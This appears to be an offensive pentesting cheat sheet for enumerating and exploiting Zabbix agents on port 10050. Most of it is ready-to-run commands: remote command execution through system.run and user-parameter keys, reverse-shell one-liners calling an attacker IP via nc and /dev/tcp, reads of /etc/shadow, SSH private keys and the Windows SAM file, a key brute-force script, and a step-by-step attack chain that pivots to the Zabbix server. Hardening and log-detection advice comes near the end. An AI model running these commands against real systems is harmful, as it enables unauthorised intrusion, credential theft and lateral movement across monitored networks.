# ZABBIX AGENT ENUMERATION (Port 10050/TCP)

## SERVICE OVERVIEW
```
Zabbix Agent - Monitoring agent for Zabbix monitoring system
- Port: 10050/TCP (agent passive mode)
- Port: 10051/TCP (Zabbix server/proxy)
- Collects metrics from monitored hosts
- Can execute commands remotely
- Potential for remote code execution if misconfigured
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p10050 <IP>                           # Service/Version detection
nc -nv <IP> 10050                               # Manual connection
telnet <IP> 10050                               # Alternative connection
echo "agent.version" | nc -nv <IP> 10050        # Query version
```

## NMAP ENUMERATION
```bash
# Zabbix agent detection
nmap -sV -p10050,10051 <IP>                     # Both agent and server ports
nmap -p10050 --script banner <IP>               # Banner grab

# Comprehensive scan
nmap -sV -p10050,10051 <IP> -oA zabbix_scan
```

## ZABBIX AGENT QUERIES
```bash
# Query Zabbix agent for information
# Format: zabbix_get -s <host> -k <key>

# Install zabbix-get
apt-get install zabbix-get                      # Debian/Ubuntu
yum install zabbix-get                          # RHEL/CentOS

# Get agent version
zabbix_get -s <IP> -k agent.version

# Get agent hostname
zabbix_get -s <IP> -k agent.hostname

# Get agent ping (checks if active)
zabbix_get -s <IP> -k agent.ping

# Get system information
zabbix_get -s <IP> -k system.uname
zabbix_get -s <IP> -k system.hostname
zabbix_get -s <IP> -k system.cpu.num
zabbix_get -s <IP> -k vm.memory.size[total]

# Get process list
zabbix_get -s <IP> -k proc.num[]

# Get network interfaces
zabbix_get -s <IP> -k net.if.discovery
```

## COMMON ZABBIX AGENT KEYS
```bash
# System information
agent.hostname                                  # Configured hostname
agent.ping                                      # Agent availability (returns 1)
agent.version                                   # Zabbix agent version
system.uname                                    # OS information
system.hostname                                 # System hostname
system.cpu.num                                  # Number of CPUs
system.uptime                                   # System uptime
system.boottime                                 # System boot time

# Memory
vm.memory.size[total]                           # Total memory
vm.memory.size[free]                            # Free memory

# Processes
proc.num[]                                      # Number of processes
proc.num[<name>]                                # Number of specific process

# Network
net.if.discovery                                # Network interface discovery
net.if.in[<interface>]                          # Incoming traffic
net.if.out[<interface>]                         # Outgoing traffic

# Files
vfs.file.exists[<path>]                         # Check if file exists
vfs.file.contents[<path>]                       # File contents (if enabled!)
vfs.file.size[<path>]                           # File size

# Custom user parameters (if configured)
# Can execute arbitrary commands!
```

## REMOTE COMMAND EXECUTION (RCE)
```bash
# Zabbix agent can execute commands via user parameters
# If EnableRemoteCommands=1 in zabbix_agentd.conf

# User parameters format in config:
# UserParameter=custom.key,command

# Example misconfigurations:
# UserParameter=run[*],/bin/sh -c "$1"
# UserParameter=exec[*],$1

# Exploit RCE (if misconfigured)
zabbix_get -s <IP> -k "run[whoami]"
zabbix_get -s <IP> -k "exec[id]"
zabbix_get -s <IP> -k "system.run[whoami]"

# Common RCE keys to test:
system.run[<command>]
run[<command>]
exec[<command>]
shell[<command>]

# Get reverse shell
zabbix_get -s <IP> -k "system.run[nc <attacker_IP> 4444 -e /bin/bash]"
zabbix_get -s <IP> -k "system.run[bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1]"
```

## FILE ACCESS
```bash
# Read files (if vfs.file.contents is enabled)
zabbix_get -s <IP> -k vfs.file.contents[/etc/passwd]
zabbix_get -s <IP> -k vfs.file.contents[/etc/shadow]
zabbix_get -s <IP> -k vfs.file.contents[/home/user/.ssh/id_rsa]

# Check if file exists
zabbix_get -s <IP> -k vfs.file.exists[/etc/passwd]

# Windows files
zabbix_get -s <IP> -k vfs.file.contents[C:\\Windows\\System32\\config\\SAM]
zabbix_get -s <IP> -k vfs.file.contents[C:\\Users\\Administrator\\.ssh\\id_rsa]
```

## METASPLOIT MODULES
```bash
msfconsole

# Zabbix agent scanner
use auxiliary/scanner/zabbix/zabbix_agent_scanner
set RHOSTS <IP>
set RPORT 10050
run

# Zabbix server login (port 10051)
use auxiliary/scanner/zabbix/zabbix_login
set RHOSTS <IP>
set RPORT 10051
run
```

## ENUMERATE CUSTOM KEYS
```bash
# Zabbix agent doesn't list available keys
# Need to guess or brute force common keys

# Common custom key patterns:
custom.*
user.*
run.*
exec.*
system.run.*
shell.*

# Brute force keys
cat > zabbix_key_brute.sh <<'EOF'
#!/bin/bash
IP=$1
KEYS=$2

for key in $(cat $KEYS); do
    result=$(zabbix_get -s $IP -k "$key" 2>&1)
    if [[ ! "$result" =~ "ZBX_NOTSUPPORTED" ]]; then
        echo "[+] Key found: $key"
        echo "    Result: $result"
    fi
done
EOF

# Key wordlist
cat > keys.txt <<EOF
system.run[whoami]
run[whoami]
exec[id]
shell[uname -a]
custom.exec[whoami]
EOF

chmod +x zabbix_key_brute.sh
./zabbix_key_brute.sh <IP> keys.txt
```

## VULNERABILITY SCANNING
```bash
# Search for Zabbix exploits
searchsploit zabbix

# Known vulnerabilities:
# CVE-2017-2824: Zabbix Server Active Proxy Trapper RCE
# CVE-2016-10134: Zabbix Agent EnableRemoteCommands RCE
# CVE-2013-5743: Zabbix SQL Injection

# Check version
zabbix_get -s <IP> -k agent.version

# Nmap vuln scan
nmap -p10050 --script vuln <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ EnableRemoteCommands=1 (allows command execution)
☐ AllowRoot=1 (agent runs as root)
☐ Dangerous user parameters (run[*], exec[*], system.run[*])
☐ vfs.file.contents enabled (file read access)
☐ No Server/ServerActive restriction (accepts from any IP)
☐ Zabbix agent exposed to internet
☐ Outdated Zabbix version with known vulnerabilities
☐ No firewall restricting access to port 10050
☐ Weak Zabbix server credentials (if agent connects to rogue server)
```

## QUICK WIN CHECKLIST
```
☐ Scan for Zabbix agent on port 10050
☐ Get agent version (zabbix_get -k agent.version)
☐ Enumerate system information (hostname, OS, uptime)
☐ Test for file read access (vfs.file.contents)
☐ Try to read /etc/passwd, /etc/shadow
☐ Test for RCE (system.run[whoami], run[id], exec[uname])
☐ Get reverse shell if RCE available
☐ Check if agent runs as root (AllowRoot=1)
☐ Enumerate network interfaces and IPs
☐ Brute force custom user parameters
```

## ONE-LINER ENUMERATION
```bash
# Quick Zabbix agent enumeration
echo "agent.version" | nc -nv <IP> 10050

# Get version with zabbix_get
zabbix_get -s <IP> -k agent.version

# Test for RCE
zabbix_get -s <IP> -k "system.run[whoami]"
```

## SECURITY IMPLICATIONS
```
RISKS:
- Remote code execution (if EnableRemoteCommands=1)
- File read access (vfs.file.contents)
- Information disclosure (system info, processes, network)
- Privilege escalation (if agent runs as root)
- Credential theft (read SSH keys, config files)
- Lateral movement (pivot to monitored systems)
- DoS (overload agent with requests)

POST-COMPROMISE:
- Read sensitive files (/etc/shadow, SSH keys)
- Execute commands for reconnaissance
- Install backdoor via RCE
- Escalate privileges (if root agent)
- Pivot to other monitored hosts
- Modify Zabbix server connection (point to rogue server)

RECOMMENDATIONS:
- Set EnableRemoteCommands=0 (disable remote commands)
- Set AllowRoot=0 (don't run as root)
- Restrict Server/ServerActive to trusted Zabbix server IPs
- Disable dangerous user parameters (system.run, exec, etc.)
- Firewall port 10050 to trusted networks only
- Keep Zabbix agent updated
- Use TLS encryption (zabbix_agentd.conf: TLSConnect=cert)
- Regular security audits
- Monitor agent access logs
- Implement least privilege
```

## ZABBIX AGENT CONFIGURATION
```bash
# Zabbix agent config file locations:
# Linux: /etc/zabbix/zabbix_agentd.conf
# Windows: C:\Program Files\Zabbix Agent\zabbix_agentd.conf

# Key security settings:
Server=<zabbix_server_IP>                       # Allowed server IP
ServerActive=<zabbix_server_IP>                 # Active checks server
Hostname=<unique_hostname>                      # Agent hostname
EnableRemoteCommands=0                          # Disable RCE (IMPORTANT!)
AllowRoot=0                                     # Don't run as root
UnsafeUserParameters=0                          # Restrict user parameters

# Dangerous settings (avoid):
EnableRemoteCommands=1                          # Allows RCE
AllowRoot=1                                     # Runs as root (bad!)
Server=0.0.0.0/0                                # Accepts from any IP (bad!)
```

## TOOLS
```bash
# zabbix_get
apt-get install zabbix-get
zabbix_get -s <IP> -k <key>

# Nmap
nmap -sV -p10050 <IP>

# Netcat
nc -nv <IP> 10050

# Metasploit
use auxiliary/scanner/zabbix/zabbix_agent_scanner

# searchsploit
searchsploit zabbix
```

## DEFENSE DETECTION
```bash
# Monitor for Zabbix agent abuse:
# - Connections from unexpected IPs
# - Unusual queries (file access, command execution)
# - High query volume
# - Failed connection attempts

# Zabbix agent logs
# Linux: /var/log/zabbix/zabbix_agentd.log
# Windows: C:\Program Files\Zabbix Agent\zabbix_agentd.log

tail -f /var/log/zabbix/zabbix_agentd.log

# Check for suspicious queries
grep -i "system.run\|vfs.file.contents" /var/log/zabbix/zabbix_agentd.log

# Audit Zabbix configuration
grep -E "EnableRemoteCommands|AllowRoot|Server=" /etc/zabbix/zabbix_agentd.conf
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover Zabbix agent
nmap -p10050 <IP>

# 2. Get version
zabbix_get -s <IP> -k agent.version

# 3. Test for RCE
zabbix_get -s <IP> -k "system.run[whoami]"

# 4. Get reverse shell
nc -lvnp 4444                                   # Listener
zabbix_get -s <IP> -k "system.run[bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1]"

# 5. Post-exploitation
# Enumerate system
whoami && id && uname -a

# 6. Read Zabbix config for server IPs
cat /etc/zabbix/zabbix_agentd.conf | grep Server

# 7. Pivot to Zabbix server (port 10051)
# Attack Zabbix server for full monitoring infrastructure compromise
```

## ZABBIX SERVER (PORT 10051)
```bash
# Related port: 10051 (Zabbix server/proxy)
# See: SERVICE ENUM/10051 Zabbix Server.md

# If you compromise Zabbix agent (10050):
# - Can pivot to Zabbix server (10051)
# - Full monitoring infrastructure compromise
# - Access to all monitored hosts
```
